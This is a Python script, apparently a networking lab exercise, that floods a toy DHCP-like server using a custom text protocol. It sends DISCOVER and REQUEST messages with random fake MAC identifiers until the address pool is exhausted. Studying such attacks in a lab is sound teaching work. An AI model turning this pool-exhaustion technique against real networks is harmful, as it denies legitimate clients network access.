#!/usr/bin/env python3
import uuid
import socket
from datetime import datetime
import string
import random

# Time operations in python
# timestamp = datetime.fromisoformat(isotimestring)

def parse_message(message):
    decodedMessage = message.decode()
    print("Attacker recieved -> " + decodedMessage)
    parsedMessage = decodedMessage.split(" ")
    return parsedMessage

def processResponse(parsed_message):
    if parsed_message[0] == "OFFER":
        send_Request(parsed_message[1], parsed_message[2], parsed_message[3])
        message, _ = CLIENTSOCKET.recvfrom(4096)
        parsed_message = parse_message(message)
        dhcpAction = processResponse(parsed_message)
        pass
    if parsed_message[0] == "ACKNOWLEDGE":
        initiateAttack()
        pass
    if parsed_message[0] == "DECLINE":
        print("No address offered, Allocation declined")
        initiateAttack()
        pass

def send_Request(macAddress, ipAddress, timestamp):
    message = "REQUEST " + macAddress + " " + ipAddress + " " + timestamp
    send_Message(message)
    pass

def send_Message(dhcpMessage):
    print("Attacker sending -> " + dhcpMessage)
    CLIENTSOCKET.sendto(dhcpMessage.encode(), (SERVER_IP, SERVER_PORT))
    pass

def initiateAttack():
    letters = string.digits
    MAC = (''.join(random.choice(letters) for i in range(10)))
    message = "DISCOVER " + MAC
    CLIENTSOCKET.sendto(message.encode(), (SERVER_IP, SERVER_PORT))
    message, _ = CLIENTSOCKET.recvfrom(4096)
    parsed_message = parse_message(message)
    dhcpAction = processResponse(parsed_message)


# Extract local MAC address [DO NOT CHANGE]
MAC = ":".join(["{:02x}".format((uuid.getnode() >> ele) & 0xFF) for ele in range(0, 8 * 6, 8)][::-1]).upper()
# SERVER IP AND PORT NUMBER [DO NOT CHANGE VAR NAMES]
SERVER_IP = "10.0.0.100"
SERVER_PORT = 9000


CLIENTSOCKET = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

initiateAttack()